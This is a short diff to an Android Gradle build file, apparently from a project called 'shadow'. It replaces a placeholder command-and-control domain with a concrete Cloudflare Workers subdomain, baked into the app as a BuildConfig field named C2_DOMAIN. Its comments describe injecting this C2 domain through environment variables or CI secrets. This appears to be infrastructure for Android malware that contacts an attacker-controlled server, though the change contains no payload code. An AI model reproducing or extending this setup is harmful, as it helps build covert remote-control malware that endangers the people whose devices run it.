@@ -16,8 +16,8 @@ android {
         vectorDrawables.useSupportLibrary = true
 
         // C2 Domain injection: set via env var or GitHub Secret during CI.
-        // Falls back to a placeholder for local development.
-        buildConfigField("String", "C2_DOMAIN", "\"${System.getenv("C2_DOMAIN") ?: "shadow.yourdomain.com"}\"")
+        // Default: Cloudflare Workers free subdomain
+        buildConfigField("String", "C2_DOMAIN", "\"${System.getenv("C2_DOMAIN") ?: "shadow-worker.marwannaili-23-07.workers.dev"}\"")
     }
 
     signingConfigs {
